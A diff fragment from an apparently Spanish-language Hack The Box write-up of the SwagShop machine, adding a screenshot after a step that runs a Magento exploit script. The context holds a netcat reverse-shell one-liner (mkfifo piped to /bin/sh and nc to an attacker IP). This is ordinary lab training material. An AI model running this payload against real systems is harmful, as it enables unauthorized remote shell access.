@@ -169,6 +169,8 @@ Finalmente especificamos el comando que nos reporta el artículo dentro de nuest
  
  
     python3 magento-oneshot.py --command "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 8080 >/tmp/f" http://swagshop.htb/index.php
+    
+![Captura de pantalla -2022-05-05 01-47-38](https://user-images.githubusercontent.com/103068924/166876323-c111416f-50ca-4c3a-920a-9ca6ca1ccb0e.png)
 
 Ya tenemos nuestro shell. Pero sigue sin ser funcional del todo. Para poder 
 obtener una shell completa basada en bash, utilizamos los siguientes comandos:
